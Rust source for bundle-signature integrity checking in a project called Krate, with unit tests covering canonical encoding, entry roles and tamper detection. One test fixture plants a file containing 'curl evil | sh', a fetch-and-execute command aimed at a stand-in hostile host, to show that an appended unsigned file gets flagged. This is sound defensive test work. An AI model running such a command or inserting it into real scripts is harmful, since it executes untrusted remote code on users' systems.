//! The canonical statement a publisher signature covers (IC-015).
//!
//! A signature cannot cover its own bytes, so it covers a *statement*: a
//! canonical record naming every other entry in the bundle, what role it
//! plays, how long it is, and what it hashes to. Verifying is then two steps
//! that cannot be confused -- does the signature match this statement, and
//! does this statement match the bundle in front of me.
//!
//! Three properties are load-bearing, and each one exists because its absence
//! is a known attack:
//!
//! - **Canonical.** One statement has exactly one byte encoding. Two encodings
//!   of "the same" statement would let a signature be valid for a document
//!   that reads differently to a different parser.
//! - **Complete.** Every entry in the bundle appears, including ones this
//!   version of Krate does not understand. A signature that silently ignored
//!   unknown records would let an attacker append whatever it liked to a
//!   validly signed file.
//! - **Length-bound.** Each entry carries its length beside its digest, so a
//!   path and a digest cannot be re-split into a different pairing.
//!
//! What the statement does NOT do is decide trust. It says what was signed;
//! whether the signer is trusted is a separate question, deliberately, so that
//! signing works with no account and no network (the contract's first rule:
//! "Login is not required to answer the first question").

use std::collections::BTreeMap;

use sha2::{Digest, Sha256};

use crate::provenance::{self, Layer};

/// Version of the statement encoding.
///
/// Recorded inside the signed bytes, so a verifier that does not understand a
/// future encoding refuses rather than guessing at it. A signature is a
/// promise about an exact format; a parser that shrugs at an unknown version
/// has broken that promise.
pub const STATEMENT_SCHEMA: &str = "krate.bundle.statement.v1";

/// What part an entry plays in the bundle.
///
/// The role travels inside the signed bytes because it changes what a
/// verifier may conclude. `code.wasm` moved into `assets/` is a different
/// bundle even if every byte is accounted for, and without roles the two
/// would produce the same statement.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Role {
    /// `manifest.toml` -- what the app declares and asks for.
    Manifest,
    /// `code.wasm` -- what actually executes.
    Component,
    /// `assets/**` -- read-only files the app ships with.
    Asset,
    /// `source/**` -- what a person could rebuild.
    Source,
    /// `sdk/**` -- the interface the source was written against.
    Sdk,
    /// Anything this version of Krate does not recognise.
    ///
    /// Covered deliberately. An unknown record is exactly what an attacker
    /// would add to a signed bundle, so it is signed over and named as
    /// unknown rather than dropped.
    Unknown,
}

impl Role {
    /// The role's stable wire name. Never derived from the enum's spelling:
    /// renaming a variant must not silently change signed bytes.
    pub fn as_str(self) -> &'static str {
        match self {
            Role::Manifest => "manifest",
            Role::Component => "component",
            Role::Asset => "asset",
            Role::Source => "source",
            Role::Sdk => "sdk",
            Role::Unknown => "unknown",
        }
    }

    /// Which role an entry name carries in the current format.
    pub fn of(entry: &str) -> Role {
        match entry {
            crate::MANIFEST_ENTRY => Role::Manifest,
            crate::COMPONENT_ENTRY => Role::Component,
            _ if entry.starts_with(crate::ASSETS_PREFIX) => Role::Asset,
            _ if entry.starts_with(crate::SOURCE_PREFIX) => Role::Source,
            _ if entry.starts_with(crate::SDK_PREFIX) => Role::Sdk,
            _ => Role::Unknown,
        }
    }
}

/// One covered entry: its name, role, length and digest.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CoveredEntry {
    pub path: String,
    pub role: Role,
    pub length: u64,
    /// Lowercase hex SHA-256 of the entry's bytes.
    pub digest: String,
}

/// The complete statement a signature covers.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SignedStatement {
    pub schema: String,
    /// The application namespace this release claims, once publisher keys
    /// exist. Empty until then, and covered either way so that adding it
    /// later cannot be done silently to an already-signed bundle.
    pub namespace: String,
    /// The version this release claims.
    pub version: String,
    /// Every entry in the bundle, sorted by path.
    pub entries: Vec<CoveredEntry>,
    /// The layered identities, so a verifier can tell WHICH kind of change it
    /// is looking at without recomputing them (IC-712).
    pub execution_digest: String,
    pub project_digest: String,
}

impl SignedStatement {
    /// Build the statement for a bundle's entries.
    ///
    /// `namespace` is the verified publisher/application namespace when one
    /// exists. It is a parameter rather than read from the manifest because
    /// a manifest is written by whoever made the file: taking the namespace
    /// from it would let a bundle name its own publisher, which is the exact
    /// authority the signature is supposed to establish.
    pub fn build(
        namespace: &str,
        version: &str,
        entries: &BTreeMap<String, Vec<u8>>,
    ) -> SignedStatement {
        let covered = entries
            .iter()
            .map(|(path, bytes)| {
                let mut hasher = Sha256::new();
                hasher.update(bytes);
                CoveredEntry {
                    path: path.clone(),
                    role: Role::of(path),
                    length: bytes.len() as u64,
                    digest: hex(&hasher.finalize()),
                }
            })
            .collect();

        SignedStatement {
            schema: STATEMENT_SCHEMA.to_string(),
            namespace: namespace.to_string(),
            version: version.to_string(),
            entries: covered,
            execution_digest: provenance::digest_layer(Layer::Execution, entries).digest,
            project_digest: provenance::digest_layer(Layer::Project, entries).digest,
        }
    }

    /// The exact bytes a signature is made over.
    ///
    /// Every field is length-prefixed, so no two different statements can
    /// serialize to the same bytes by shifting a boundary -- the confusion
    /// that lets one signature cover two documents.
    pub fn canonical_bytes(&self) -> Vec<u8> {
        /// One length-prefixed field. A free function rather than a closure
        /// so the entry loop can use it too without two borrows of `out`.
        fn field(out: &mut Vec<u8>, bytes: &[u8]) {
            out.extend_from_slice(&(bytes.len() as u64).to_le_bytes());
            out.extend_from_slice(bytes);
        }

        let mut out = Vec::new();
        field(&mut out, self.schema.as_bytes());
        field(&mut out, self.namespace.as_bytes());
        field(&mut out, self.version.as_bytes());
        field(&mut out, self.execution_digest.as_bytes());
        field(&mut out, self.project_digest.as_bytes());

        // The count is signed too: without it, truncating the entry list
        // would produce a prefix that still parsed.
        out.extend_from_slice(&(self.entries.len() as u64).to_le_bytes());
        for entry in &self.entries {
            field(&mut out, entry.path.as_bytes());
            field(&mut out, entry.role.as_str().as_bytes());
            out.extend_from_slice(&entry.length.to_le_bytes());
            field(&mut out, entry.digest.as_bytes());
        }
        out
    }

    /// Does this statement describe the bundle in front of us?
    ///
    /// Answered separately from "is the signature valid", because the two
    /// failures mean different things: a bad signature is a wrong or absent
    /// signer, while a mismatch here is a file that was changed after it was
    /// signed. Reporting one as the other sends somebody looking in the
    /// wrong place.
    ///
    /// Returns every discrepancy rather than the first, so a person sees the
    /// shape of what happened instead of peeling it one file at a time.
    pub fn check_against(&self, entries: &BTreeMap<String, Vec<u8>>) -> Vec<Mismatch> {
        let mut problems = Vec::new();
        let mut seen = BTreeMap::new();
        for entry in &self.entries {
            seen.insert(entry.path.as_str(), entry);
        }

        for entry in &self.entries {
            match entries.get(&entry.path) {
                None => problems.push(Mismatch::Missing {
                    path: entry.path.clone(),
                }),
                Some(bytes) => {
                    // Length first: a length change is the cheaper check and
                    // the clearer message.
                    if bytes.len() as u64 != entry.length {
                        problems.push(Mismatch::Length {
                            path: entry.path.clone(),
                            signed: entry.length,
                            found: bytes.len() as u64,
                        });
                        continue;
                    }
                    let mut hasher = Sha256::new();
                    hasher.update(bytes);
                    let digest = hex(&hasher.finalize());
                    if digest != entry.digest {
                        problems.push(Mismatch::Content {
                            path: entry.path.clone(),
                            role: entry.role,
                        });
                    }
                }
            }
        }

        // The direction that matters most: a file present in the bundle that
        // the statement never covered. Appending to a signed bundle is the
        // attack this whole structure exists to refuse.
        for path in entries.keys() {
            if !seen.contains_key(path.as_str()) {
                problems.push(Mismatch::Uncovered { path: path.clone() });
            }
        }
        problems
    }
}

/// A way a bundle can disagree with the statement signed over it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Mismatch {
    /// The statement covers a file the bundle does not have.
    Missing { path: String },
    /// The bundle has a file nobody signed for.
    Uncovered { path: String },
    /// Same path, different size.
    Length {
        path: String,
        signed: u64,
        found: u64,
    },
    /// Same path and size, different bytes.
    Content { path: String, role: Role },
}

impl std::fmt::Display for Mismatch {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Mismatch::Missing { path } => {
                write!(f, "{path} was signed for but is not in this file")
            }
            Mismatch::Uncovered { path } => {
                write!(f, "{path} is in this file but nobody signed for it")
            }
            Mismatch::Length {
                path,
                signed,
                found,
            } => write!(f, "{path} was signed at {signed} bytes and is now {found}"),
            Mismatch::Content { path, role } => {
                write!(f, "{path} ({}) was changed after signing", role.as_str())
            }
        }
    }
}

fn hex(bytes: &[u8]) -> String {
    let mut out = String::with_capacity(bytes.len() * 2);
    for byte in bytes {
        out.push_str(&format!("{byte:02x}"));
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn entries(pairs: &[(&str, &[u8])]) -> BTreeMap<String, Vec<u8>> {
        pairs
            .iter()
            .map(|(path, bytes)| (path.to_string(), bytes.to_vec()))
            .collect()
    }

    fn sample() -> BTreeMap<String, Vec<u8>> {
        entries(&[
            ("manifest.toml", b"id = 'dev.krate.notes'"),
            ("code.wasm", b"\0asm\x01\0\0\0"),
            ("assets/logo.png", b"png-bytes"),
            ("source/src/lib.rs", b"fn main() {}"),
            ("sdk/krate.wit", b"world cli"),
        ])
    }

    #[test]
    fn every_entry_is_covered_with_its_role() {
        let statement = SignedStatement::build("pub/notes", "1.0.0", &sample());
        let roles: Vec<_> = statement
            .entries
            .iter()
            .map(|e| (e.path.as_str(), e.role))
            .collect();
        assert_eq!(
            roles,
            vec![
                ("assets/logo.png", Role::Asset),
                ("code.wasm", Role::Component),
                ("manifest.toml", Role::Manifest),
                ("sdk/krate.wit", Role::Sdk),
                ("source/src/lib.rs", Role::Source),
            ],
            "sorted by path, and every namespace named"
        );
    }

    #[test]
    fn the_same_statement_always_serializes_to_the_same_bytes() {
        let one = SignedStatement::build("pub/notes", "1.0.0", &sample());
        let two = SignedStatement::build("pub/notes", "1.0.0", &sample());
        assert_eq!(one.canonical_bytes(), two.canonical_bytes());
    }

    /// A signature is a promise about exact bytes, so every field that could
    /// change meaning must change the bytes.
    #[test]
    fn changing_anything_that_matters_changes_the_signed_bytes() {
        let base = SignedStatement::build("pub/notes", "1.0.0", &sample());

        let other_namespace = SignedStatement::build("someone-else/notes", "1.0.0", &sample());
        assert_ne!(
            base.canonical_bytes(),
            other_namespace.canonical_bytes(),
            "a different publisher is a different statement"
        );

        let other_version = SignedStatement::build("pub/notes", "1.0.1", &sample());
        assert_ne!(
            base.canonical_bytes(),
            other_version.canonical_bytes(),
            "a version is part of what was signed, or a rollback is invisible"
        );

        let mut changed = sample();
        changed.insert("code.wasm".into(), b"\0asm-different".to_vec());
        assert_ne!(
            base.canonical_bytes(),
            SignedStatement::build("pub/notes", "1.0.0", &changed).canonical_bytes(),
        );
    }

    /// The boundary-shifting attack: two different statements must never
    /// serialize identically by moving where one field ends and the next
    /// begins.
    #[test]
    fn fields_cannot_be_reinterpreted_by_shifting_a_boundary() {
        let a = SignedStatement::build("ab", "c", &BTreeMap::new());
        let b = SignedStatement::build("a", "bc", &BTreeMap::new());
        assert_ne!(
            a.canonical_bytes(),
            b.canonical_bytes(),
            "length prefixes are what stop 'ab'+'c' and 'a'+'bc' colliding"
        );
    }

    #[test]
    fn a_statement_matches_the_bundle_it_was_built_from() {
        let bundle = sample();
        let statement = SignedStatement::build("pub/notes", "1.0.0", &bundle);
        assert!(statement.check_against(&bundle).is_empty());
    }

    /// Appending to a signed bundle is the attack the completeness rule
    /// exists for.
    #[test]
    fn a_file_nobody_signed_for_is_refused() {
        let signed = sample();
        let statement = SignedStatement::build("pub/notes", "1.0.0", &signed);

        let mut tampered = signed.clone();
        tampered.insert("extra/payload.sh".into(), b"curl evil | sh".to_vec());
        let problems = statement.check_against(&tampered);
        assert_eq!(
            problems,
            vec![Mismatch::Uncovered {
                path: "extra/payload.sh".to_string()
            }],
            "an added file must be named, not ignored"
        );
        assert!(problems[0].to_string().contains("nobody signed for it"));
    }

    /// An unknown record is signed over as unknown, so it cannot be swapped
    /// after the fact either.
    #[test]
    fn records_this_version_does_not_understand_are_still_covered() {
        let mut with_future = sample();
        with_future.insert("future/thing.bin".into(), b"v2 data".to_vec());
        let statement = SignedStatement::build("pub/notes", "1.0.0", &with_future);
        let unknown = statement
            .entries
            .iter()
            .find(|e| e.path == "future/thing.bin")
            .expect("an unrecognised record must still be covered");
        assert_eq!(unknown.role, Role::Unknown);

        let mut swapped = with_future.clone();
        swapped.insert("future/thing.bin".into(), b"v2 evil".to_vec());
        assert_eq!(
            statement.check_against(&swapped),
            vec![Mismatch::Content {
                path: "future/thing.bin".to_string(),
                role: Role::Unknown
            }],
            "not understanding a record is no reason to let it change"
        );
    }

    #[test]
    fn a_changed_file_is_named_with_the_part_it_plays() {
        let signed = sample();
        let statement = SignedStatement::build("pub/notes", "1.0.0", &signed);
        // Same LENGTH, different bytes -- the case a size check cannot catch,
        // and the reason the digest is compared at all.
        let mut tampered = signed.clone();
        tampered.insert("source/src/lib.rs".into(), b"fn main() {!}"[..12].to_vec());
        assert_eq!(
            tampered["source/src/lib.rs"].len(),
            signed["source/src/lib.rs"].len(),
            "the fixture must change content without changing size, or this \
             test proves only that the length check works",
        );

        let problems = statement.check_against(&tampered);
        assert_eq!(
            problems,
            vec![Mismatch::Content {
                path: "source/src/lib.rs".to_string(),
                role: Role::Source
            }]
        );
        assert!(problems[0].to_string().contains("(source)"));
    }

    #[test]
    fn a_removed_file_is_reported_as_missing_not_as_a_pass() {
        let signed = sample();
        let statement = SignedStatement::build("pub/notes", "1.0.0", &signed);
        let mut stripped = signed.clone();
        stripped.remove("sdk/krate.wit");
        assert_eq!(
            statement.check_against(&stripped),
            vec![Mismatch::Missing {
                path: "sdk/krate.wit".to_string()
            }],
        );
    }

    /// Every discrepancy at once, because a person fixing a broken bundle
    /// needs its shape, not the first thing that went wrong.
    #[test]
    fn all_discrepancies_are_reported_together() {
        let signed = sample();
        let statement = SignedStatement::build("pub/notes", "1.0.0", &signed);
        let mut wrecked = signed.clone();
        wrecked.remove("assets/logo.png");
        wrecked.insert("code.wasm".into(), b"\0asm-swapped!".to_vec());
        wrecked.insert("added.txt".into(), b"new".to_vec());

        let problems = statement.check_against(&wrecked);
        assert_eq!(problems.len(), 3, "got: {problems:?}");
    }
}
